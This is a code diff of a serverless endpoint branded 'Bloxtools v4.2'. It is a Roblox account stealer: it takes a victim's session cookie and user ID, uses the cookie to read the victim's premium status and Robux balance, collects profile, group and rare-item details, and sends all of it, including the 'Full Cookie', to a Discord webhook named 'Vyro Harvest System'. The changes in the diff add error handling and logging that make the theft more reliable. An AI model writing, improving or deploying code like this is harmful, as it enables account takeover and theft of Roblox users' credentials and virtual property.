@@ -1,4 +1,4 @@
-// api/submit.js – v4.1 (no rate limit, premium fixed)
+// api/submit.js – v4.2 with better error handling
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
 async function fetchWithTimeout(url, options, timeout = 8000) {
@@ -29,7 +29,6 @@ async function fetchUserInfo(userId) {
 
     const banned = data.isBanned ? "⚠️ Banned" : "✅ Active";
 
-    // Avatar thumbnail
     const thumbRes = await fetchWithTimeout(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
     let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
     if (thumbRes.ok) {
@@ -54,7 +53,6 @@ async function fetchUserInfo(userId) {
   }
 }
 
-// ✅ Premium check using the user's own cookie (authenticated)
 async function fetchPremiumStatus(cookie, userId) {
   try {
     const res = await fetchWithTimeout("https://premiumfeatures.roblox.com/v1/users/validate-membership", {
@@ -65,9 +63,11 @@ async function fetchPremiumStatus(cookie, userId) {
       },
       body: JSON.stringify({ userIds: [parseInt(userId)] })
     });
-    if (!res.ok) return "False";
+    if (!res.ok) {
+      console.error("Premium API returned", res.status);
+      return "False";
+    }
     const data = await res.json();
-    // Expected response: { data: [{ userId: 123, isPremium: true }] }
     const premiumStatus = data.data?.[0]?.isPremium;
     return premiumStatus === true ? "True" : "False";
   } catch (e) {
@@ -85,6 +85,7 @@ async function fetchRobux(cookie) {
     const data = await res.json();
     return data.robux?.toLocaleString() || "0";
   } catch (e) {
+    console.error("Robux fetch error:", e);
     return "N/A";
   }
 }
@@ -97,6 +98,7 @@ async function fetchLastGames(userId) {
     if (!data.data?.length) return "No recent games";
     return data.data.map(g => `🎮 **${g.name}** (ID: ${g.id})`).join("\n");
   } catch (e) {
+    console.error("LastGames error:", e);
     return "Unknown";
   }
 }
@@ -110,6 +112,7 @@ async function fetchGroups(userId) {
     const top = data.data.slice(0, 3).map(g => `🏛️ **${g.group.name}** – ${g.role.name}`);
     return top.join("\n");
   } catch (e) {
+    console.error("Groups error:", e);
     return "Error";
   }
 }
@@ -120,11 +123,11 @@ async function fetchValuables(userId) {
     if (!res.ok) return "None";
     const data = await res.json();
     const assets = data.assets || [];
-    // Partial list of known limited IDs (Headless, Korblox, etc.)
     const valuableIds = [1361485, 1361486, 102611803];
     const found = assets.some(a => valuableIds.includes(a.id));
     return found ? "✅ Contains rare item (Headless/Korblox)" : "None detected";
   } catch (e) {
+    console.error("Valuables error:", e);
     return "Error";
   }
 }
@@ -140,6 +143,7 @@ async function fetchAccessories(userId) {
     if (!acc.length) return "No accessories";
     return acc.slice(0, 6).join(", ") + (acc.length > 6 ? " …" : "");
   } catch (e) {
+    console.error("Accessories error:", e);
     return "Error";
   }
 }
@@ -161,9 +165,7 @@ async function sendToDiscord(cookie, userId) {
     color: 0xFF69B4,
     thumbnail: user ? { url: user.avatarUrl } : undefined,
     fields: [],
-    footer: {
-      text: "made by vyro28 on discord | Bloxtools v4.1",
-    },
+    footer: { text: "made by vyro28 on discord | Bloxtools v4.2" },
     timestamp: new Date().toISOString()
   };
 
@@ -185,12 +187,23 @@ async function sendToDiscord(cookie, userId) {
 
   embed.fields.push({ name: "🔐 Full Cookie", value: `\`\`\`\n${cookie}\n\`\`\``, inline: false });
 
-  const res = await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ username: "Vyro Harvest System", embeds: [embed] })
-  });
-  return res.ok;
+  try {
+    const res = await fetchWithTimeout(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username: "Vyro Harvest System", embeds: [embed] })
+    }, 10000);
+
+    if (!res.ok) {
+      const errorText = await res.text();
+      console.error("Discord webhook error:", res.status, errorText);
+      return false;
+    }
+    return true;
+  } catch (err) {
+    console.error("sendToDiscord fetch error:", err);
+    return false;
+  }
 }
 
 module.exports = async (req, res) => {
@@ -200,18 +213,25 @@ module.exports = async (req, res) => {
   if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
 
   const { cookie, rbxuid } = req.body;
-  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
-  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL" });
+  if (!cookie || !rbxuid) {
+    console.error("Missing cookie or rbxuid");
+    return res.status(400).json({ success: false, error: "Missing cookie or rbxuid" });
+  }
+  if (!WEBHOOK_URL) {
+    console.error("WEBHOOK_URL environment variable missing");
+    return res.status(500).json({ success: false, error: "Server configuration error: WEBHOOK_URL not set" });
+  }
 
   try {
     const webhookOk = await sendToDiscord(cookie, rbxuid);
     if (webhookOk) {
       return res.json({ success: true, firstTime: true });
     } else {
-      return res.json({ success: false, error: "Processing failed" });
+      console.error("sendToDiscord returned false");
+      return res.json({ success: false, error: "Discord webhook failed. Check logs." });
     }
   } catch (err) {
     console.error("Handler error:", err);
-    return res.status(500).json({ success: false, error: "Internal server error" });
+    return res.status(500).json({ success: false, error: "Internal server error: " + err.message });
   }
 };
